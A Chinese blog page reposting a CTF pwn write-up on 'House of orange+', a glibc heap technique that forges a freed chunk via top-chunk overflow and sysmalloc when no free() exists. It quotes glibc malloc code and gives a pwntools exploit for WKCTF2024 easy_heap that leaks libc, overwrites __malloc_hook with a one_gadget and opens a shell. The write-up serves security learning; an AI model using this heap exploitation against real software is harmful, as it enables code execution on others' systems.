@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>House of orange的进一步利用（house of orange+） | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="House of orange+：无free时通过堆溢出+top chunk sysmalloc伪造释放">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of orange的进一步利用（house of orange+）">
+<meta property="og:url" content="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Pwn/House_of_orange%E7%9A%84%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8-house_of_orange/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="House of orange+：无free时通过堆溢出+top chunk sysmalloc伪造释放">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2024/01/01/ctf-kb/wp/Pwn/House_of_orange%E7%9A%84%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8-house_of_orange/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'House of orange的进一步利用（house of orange+）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">House of orange的进一步利用（house of orange+）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-31T16:00:00.000Z" title="发表于 2024-01-01 00:00:00">2024-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-12-31T16:00:00.000Z" title="更新于 2024-01-01 00:00:00">2024-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Pwn/">Pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="House of orange的进一步利用（house of orange+）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/194805.html">https://www.ctfiot.com/194805.html</a><br>ID: 194805</p>
+</blockquote>
+<p>1.不能释放chunk（无free）。</p>
+<p>2.可以申请、编辑和输出多个chunk（add, edit, show）。</p>
+<p>3.存在堆溢出。</p>
+<p>一</p>
+<p>原理概述</p>
+<p>use_top:<br> victim &#x3D; av-&gt;top;<br> size &#x3D; chunksize (victim);</p>
+<p> &#x2F;<em>如果可以，就切割topchunk，返回被切下的chunk</em>&#x2F;<br> if ((unsigned long) (size) &gt;&#x3D; (unsigned long) (nb + MINSIZE)) {…}</p>
+<p> &#x2F;* 如果topchunk大小不足，则尝试触发malloc_consolidate，合并fastbin *&#x2F;<br> else if (have_fastchunks (av)) {…}</p>
+<p> &#x2F;<em>如果上述情况都不满足需求，则触发sysmalloc</em>&#x2F;<br> else<br> {<br> void *p &#x3D; sysmalloc (nb, av);<br> if (p !&#x3D; NULL)<br> alloc_perturb (p, bytes);<br> return p;<br> }</p>
+<p>if (old_size &gt;&#x3D; MINSIZE)<br>{<br> set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);<br> set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));<br> set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);<br> _int_free (av, old_top, 1); &#x2F;&#x2F;将old_top释放<br>}</p>
+<p>二</p>
+<p>例题：WKCTF2024 easy_heap</p>
+<p>add(0xbf0, b’a’)#0<br>add(0x078, b’a’)#1<br>edit(1, 0x78 + 8, flat(cyclic(0x78), 0x381), False)</p>
+<p>add(0x3f0, b’a’)#2</p>
+<p>add(0x208, b’’)#3</p>
+<p>show(3)<br>libc.address &#x3D; u64(c.recvuntil(b’  ’)[-8:]) - 0x3c4e0a<br>success(f”libcbase &#x3D; {hex(libc.address)}”)</p>
+<p>add(0x7f0, b’a’)#4<br>add(0x360, b’a’)#5</p>
+<p>edit(5, 0x360 + 0x10 + 8, flat(cyclic(0x368), 0x91))<br>add(0x460, b’a’)#6</p>
+<p>edit(5, 0x360 + 0x18, flat(cyclic(0x368), 0x71, libc.sym[‘__malloc_hook’]-0x23), False)<br>add(0x68, b’a’)#11<br>ogg &#x3D; libc.address + 0xf1247</p>
+<p>add(0x68, b’a’*0x13 + p64(ogg))#12 -&gt; &amp;__malloc_hook - 0x13</p>
+<p>cmd(1)<br>c.sendline(b’10’)<br>c.interactive()</p>
+<p>三</p>
+<p>总结</p>
+<p>看雪ID：JnamerZ</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-1002226.htm">https://bbs.kanxue.com/user-home-1002226.htm</a></p>
+<p>*本文为看雪论坛优秀文章，由 JnamerZ 原创，转载请注明来自看雪社区</p>
+<h1 id="往期推荐"><a href="#往期推荐" class="headerlink" title="往期推荐"></a>往期推荐</h1><p>1、Alt-Tab Terminator注册算法逆向</p>
+<p>2、恶意木马历险记</p>
+<p>3、VMP源码分析：反调试与绕过方法</p>
+<p>4、Chrome V8 issue 1486342浅析</p>
+<p>5、Cython逆向-语言特性分析</p>
+<p>球分享</p>
+<p>球点赞</p>
+<p>球在看</p>
+<p>点击阅读原文查看更多</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">一</span><br><span class="line">原理概述</span><br><span class="line">use_top:</span><br><span class="line"> victim = av-&gt;top;</span><br><span class="line"> size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"> /*如果可以，就切割topchunk，返回被切下的chunk*/</span><br><span class="line"> if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"> /* 如果topchunk大小不足，则尝试触发malloc_consolidate，合并fastbin */</span><br><span class="line"> else if (have_fastchunks (av)) &#123;...&#125;</span><br><span class="line"></span><br><span class="line"> /*如果上述情况都不满足需求，则触发sysmalloc*/</span><br><span class="line"> else</span><br><span class="line"> &#123;</span><br><span class="line"> void *p = sysmalloc (nb, av);</span><br><span class="line"> if (p != NULL)</span><br><span class="line"> alloc_perturb (p, bytes);</span><br><span class="line"> return p;</span><br><span class="line"> &#125;</span><br><span class="line">if (old_size &gt;= MINSIZE)</span><br><span class="line">&#123;</span><br><span class="line"> set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);</span><br><span class="line"> set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</span><br><span class="line"> set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line"> _int_free (av, old_top, 1); //将old_top释放</span><br><span class="line">&#125;</span><br><span class="line">二</span><br><span class="line">例题：WKCTF2024 easy_heap</span><br><span class="line">add(0xbf0, b&#x27;a&#x27;)#0</span><br><span class="line">add(0x078, b&#x27;a&#x27;)#1</span><br><span class="line">edit(1, 0x78 + 8, flat(cyclic(0x78), 0x381), False)</span><br><span class="line"></span><br><span class="line">add(0x3f0, b&#x27;a&#x27;)#2</span><br><span class="line">add(0x208, b&#x27;&#x27;)#3</span><br><span class="line"></span><br><span class="line">show(3)</span><br><span class="line">libc.address = u64(c.recvuntil(b&#x27;  &#x27;)[-8:]) - 0x3c4e0a</span><br><span class="line">success(f&quot;libcbase = &#123;hex(libc.address)&#125;&quot;)</span><br><span class="line">add(0x7f0, b&#x27;a&#x27;)#4</span><br><span class="line">add(0x360, b&#x27;a&#x27;)#5</span><br><span class="line">edit(5, 0x360 + 0x10 + 8, flat(cyclic(0x368), 0x91))</span><br><span class="line">add(0x460, b&#x27;a&#x27;)#6</span><br><span class="line">edit(5, 0x360 + 0x18, flat(cyclic(0x368), 0x71, libc.sym[&#x27;__malloc_hook&#x27;]-0x23), False)</span><br><span class="line">add(0x68, b&#x27;a&#x27;)#11</span><br><span class="line">ogg = libc.address + 0xf1247</span><br><span class="line"></span><br><span class="line">add(0x68, b&#x27;a&#x27;*0x13 + p64(ogg))#12 -&gt; &amp;__malloc_hook - 0x13</span><br><span class="line"></span><br><span class="line">cmd(1)</span><br><span class="line">c.sendline(b&#x27;10&#x27;)</span><br><span class="line">c.interactive()</span><br><span class="line">三</span><br><span class="line">总结</span><br></pre></td></tr></table></figure>
+
+
+<hr>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]<br>[图片已移除]</p>
+<hr>
+<blockquote>
+<p><strong>转载声明</strong>：本文转载自 <a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge">Des-CTF-Knowledge</a>（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。<br>原文链接：<a target="_blank" rel="noopener" href="https://www.ctfiot.com/194805.html">https://www.ctfiot.com/194805.html</a><br>仓库原文：<a target="_blank" rel="noopener" href="https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/House_of_orange%E7%9A%84%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%88%A9%E7%94%A8%EF%BC%88house_of_orange%2B%EF%BC%89.full.md">CTF大赛WP集合&#x2F;articles&#x2F;House_of_orange的进一步利用（house_of_orange+）.full.md</a></p>
+</blockquote>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Pwn/Heap_exploitation-_glibc_internals_and_nifty_tricks/" title="Heap exploitation, glibc internals and nifty tricks"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Heap exploitation, glibc internals and nifty tricks</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Pwn/House_of_water_-_TFCCTF_2024_MCGUAVA/" title="House of water + TFCCTF 2024 MCGUAVA"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">House of water + TFCCTF 2024 MCGUAVA</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/01/01/ctf-kb/wp/Pwn/CTF%E6%AF%94%E8%B5%9BPWN%E9%A2%98%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E4%B8%80/" title="CTF比赛PWN题解题思路(一)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-01</div><div class="title">CTF比赛PWN题解题思路(一)</div></div></a></div><div><a href="/2023/01/01/ctf-kb/wp/Pwn/Codegate_CTF_2023-_pcpu_-_sea/" title="Codegate CTF 2023: pcpu &amp; sea"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-01</div><div class="title">Codegate CTF 2023: pcpu &amp; sea</div></div></a></div><div><a href="/2024/01/01/ctf-kb/wp/Pwn/DeadSec_CTF_2024_writeup_by_Mini-Venom/" title="DeadSec CTF 2024 writeup by Mini-Venom"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-01</div><div class="title">DeadSec CTF 2024 writeup by Mini-Venom</div></div></a></div><div><a href="/2023/01/01/ctf-kb/wp/Pwn/DamCTF_and_Midnight_Sun_CTF_Qualifiers_pwn%E9%83%A8%E5%88%86wp/" title="DamCTF and Midnight Sun CTF Qualifiers pwn部分wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-01</div><div class="title">DamCTF and Midnight Sun CTF Qualifiers pwn部分wp</div></div></a></div><div><a href="/2023/01/01/ctf-kb/wp/Pwn/DiceCTF_2023_Writeup_by_r3kapig/" title="DiceCTF 2023 Writeup by r3kapig"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-01</div><div class="title">DiceCTF 2023 Writeup by r3kapig</div></div></a></div><div><a href="/2024/01/01/ctf-kb/wp/Pwn/F.Z.N_CTF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9BPWN%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/" title="F.Z.N CTF网络安全大赛PWN方向题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-01-01</div><div class="title">F.Z.N CTF网络安全大赛PWN方向题解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%80%E6%9C%9F%E6%8E%A8%E8%8D%90"><span class="toc-number">1.</span> <span class="toc-text">往期推荐</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%9B%BE"><span class="toc-number">1.1.</span> <span class="toc-text">附图</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
